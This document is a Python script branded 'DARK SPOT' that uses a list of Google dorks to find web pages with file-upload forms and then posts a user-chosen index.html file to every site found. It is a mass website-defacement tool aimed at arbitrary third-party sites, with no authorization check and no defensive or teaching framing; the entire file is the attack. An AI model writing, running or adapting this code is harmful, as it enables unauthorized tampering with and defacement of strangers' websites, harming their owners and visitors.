import requests
from colorama import Fore, init
import os
import pyfiglet
from googlesearch import search

# Initialize colorama for colored output
init(autoreset=True)

# Display the tool's name using pyfiglet
ascii_banner = pyfiglet.figlet_format("DARK SPOT")
print(Fore.RED + ascii_banner)

# Function to use Google Dorks to get a list of sites
def get_sites_from_dorks(dorks, num_results=10):
    sites = []
    for dork in dorks:
        print(Fore.YELLOW + f"[*] Searching using dork: {dork}")
        try:
            for result in search(dork, num_results=num_results):
                sites.append(result)
                print(Fore.GREEN + f"[+] Found site: {result}")
        except Exception as e:
            print(Fore.RED + f"[-] Error while searching with dork: {dork} - {e}")
    return sites

# Function to check for file upload vulnerabilities and try to upload the index
def upload_index(site, index_file):
    try:
        # Attempt to upload the index file using POST
        files = {'file': ('index.html', open(index_file, 'rb'), 'text/html')}
        response = requests.post(site, files=files)

        # Check the response status
        if response.status_code == 200:
            print(Fore.GREEN + f"[+] Successfully uploaded index to: {site}")
        else:
            print(Fore.RED + f"[-] Failed to upload index to: {site} - Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Connection error to {site}: {e}")

# Main function
def main():
    # List of Google Dorks used to search for sites
    dorks = [
        "inurl:/upload.php", "inurl:/file_upload.php", "inurl:/admin/upload.php",
        "intitle:'index of /upload'", "inurl:/upload.html", "inurl:/upload.aspx",
        "intitle:'index of' intext:'upload'", "inurl:/upload.jsp", "inurl:/upload.aspx"
    ]

    # Request the index file path from the user
    index_file = input(Fore.YELLOW + "Enter the path to the index file (e.g., index.html): ")

    # Check if the index file exists
    if not os.path.isfile(index_file):
        print(Fore.RED + f"[-] Index file not found at path: {index_file}")
        return

    # Get sites using the Google Dorks
    sites = get_sites_from_dorks(dorks, num_results=10)

    # Attempt to upload the index to each site
    for site in sites:
        print(Fore.BLUE + f"[*] Attempting to upload to site: {site}")
        upload_index(site, index_file)

# Run the main function
if __name__ == "__main__":
    main()
